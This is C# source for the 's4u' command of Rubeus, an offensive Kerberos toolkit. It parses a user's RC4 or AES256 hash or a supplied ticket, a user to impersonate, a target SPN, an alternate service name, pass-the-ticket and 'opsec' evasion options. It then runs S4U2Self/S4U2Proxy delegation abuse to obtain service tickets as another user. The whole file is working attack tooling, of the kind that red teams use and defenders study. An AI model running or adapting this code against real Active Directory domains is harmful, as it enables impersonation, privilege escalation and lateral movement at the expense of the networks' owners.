using System;
using System.Collections.Generic;
using System.IO;

namespace Rubeus.Commands
{
    public class S4u : ICommand
    {
        public static string CommandName => "s4u";

        public void Execute(Dictionary<string, string> arguments)
        {
            Console.WriteLine("[*] Action: S4U\r\n");

            string targetUser = "";
            string targetSPN = "";
            string altSname = "";
            string user = "";
            string domain = "";
            string hash = "";
            string outfile = "";
            bool ptt = false;
            string dc = "";
            string targetDomain = "";
            string targetDC = "";
            string impersonateDomain = "";
            bool self = false;
            bool opsec = false;
            Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.subkey_keymaterial; // throwaway placeholder, changed to something valid
            KRB_CRED tgs = null;

            if (arguments.ContainsKey("/user"))
            {
                string[] parts = arguments["/user"].Split('\\');
                if (parts.Length == 2)
                {
                    domain = parts[0];
                    user = parts[1];
                }
                else
                {
                    user = arguments["/user"];
                }
            }
            if (arguments.ContainsKey("/domain"))
            {
                domain = arguments["/domain"];
            }
            if (arguments.ContainsKey("/ptt"))
            {
                ptt = true;
            }
            if (arguments.ContainsKey("/dc"))
            {
                dc = arguments["/dc"];
            }
            if (arguments.ContainsKey("/rc4"))
            {
                hash = arguments["/rc4"];
                encType = Interop.KERB_ETYPE.rc4_hmac;
            }
            if (arguments.ContainsKey("/aes256"))
            {
                hash = arguments["/aes256"];
                encType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
            }
            if (arguments.ContainsKey("/impersonateuser"))
            {
                if (arguments.ContainsKey("/tgs"))
                {
                    Console.WriteLine("\r\n[X] You must supply either a /impersonateuser or a /tgs, but not both.\r\n");
                    return;
                }
                targetUser = arguments["/impersonateuser"];
            }
            if (arguments.ContainsKey("/impersonatedomain"))
            {
                impersonateDomain = arguments["/impersonatedomain"];
            }
            if (arguments.ContainsKey("/targetdomain"))
            {
                targetDomain = arguments["/targetdomain"];
            }
            if (arguments.ContainsKey("/targetdc"))
            {
                targetDC = arguments["/targetdc"];
            }
            if (arguments.ContainsKey("/outfile"))
            {
                outfile = arguments["/outfile"];
            }

            if (arguments.ContainsKey("/msdsspn"))
            {
                targetSPN = arguments["/msdsspn"];
            }

            if (arguments.ContainsKey("/altservice"))
            {
                altSname = arguments["/altservice"];
            }

            if (arguments.ContainsKey("/self"))
            {
                self = true;
            }

            if (arguments.ContainsKey("/opsec"))
            {
                opsec = true;
            }

            if (arguments.ContainsKey("/tgs"))
            {
                string kirbi64 = arguments["/tgs"];

                if (Helpers.IsBase64String(kirbi64))
                {
                    byte[] kirbiBytes = Convert.FromBase64String(kirbi64);
                    tgs = new KRB_CRED(kirbiBytes);
                }
                else if (File.Exists(kirbi64))
                {
                    byte[] kirbiBytes = File.ReadAllBytes(kirbi64);
                    tgs = new KRB_CRED(kirbiBytes);
                }
                else
                {
                    Console.WriteLine("\r\n[X] /tgs:X must either be a .kirbi file or a base64 encoded .kirbi\r\n");
                    return;
                }

                targetUser = tgs.enc_part.ticket_info[0].pname.name_string[0];
            }

            if (String.IsNullOrEmpty(domain))
            {
                domain = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
            }
            if (String.IsNullOrEmpty(targetUser) && tgs == null)
            {
                Console.WriteLine("\r\n[X] You must supply a /tgs to impersonate!\r\n");
                Console.WriteLine("[X] Alternatively, supply a /impersonateuser to perform S4U2Self first.\r\n");
                return;
            }
            if (String.IsNullOrEmpty(targetSPN) && tgs != null)
            {
                Console.WriteLine("\r\n[X] If a /tgs is supplied, you must also supply a /msdsspn !\r\n");
                return;
            }

            if (arguments.ContainsKey("/ticket"))
            {
                string kirbi64 = arguments["/ticket"];

                if (Helpers.IsBase64String(kirbi64))
                {
                    byte[] kirbiBytes = Convert.FromBase64String(kirbi64);
                    KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
                    S4U.Execute(kirbi, targetUser, targetSPN, outfile, ptt, dc, altSname, tgs, targetDC, targetDomain, self, opsec, domain, impersonateDomain);
                }
                else if (File.Exists(kirbi64))
                {
                    byte[] kirbiBytes = File.ReadAllBytes(kirbi64);
                    KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
                    S4U.Execute(kirbi, targetUser, targetSPN, outfile, ptt, dc, altSname, tgs, targetDC, targetDomain, self, opsec, domain, impersonateDomain);
                }
                else
                {
                    Console.WriteLine("\r\n[X] /ticket:X must either be a .kirbi file or a base64 encoded .kirbi\r\n");
                }
                return;
            }
            else if (arguments.ContainsKey("/user"))
            {
                // if the user is supplying a user and rc4/aes256 hash to first execute a TGT request

                user = arguments["/user"];

                if (String.IsNullOrEmpty(hash))
                {
                    Console.WriteLine("\r\n[X] You must supply a /rc4 or /aes256 hash!\r\n");
                    return;
                }

                S4U.Execute(user, domain, hash, encType, targetUser, targetSPN, outfile, ptt, dc, altSname, tgs, targetDC, targetDomain, self, opsec);
                return;
            }
            else
            {
                Console.WriteLine("\r\n[X] A /ticket:X needs to be supplied for S4U!\r\n");
                Console.WriteLine("[X] Alternatively, supply a /user and </rc4:X | /aes256:X> hash to first retrieve a TGT.\r\n");
                return;
            }
        }
    }
}
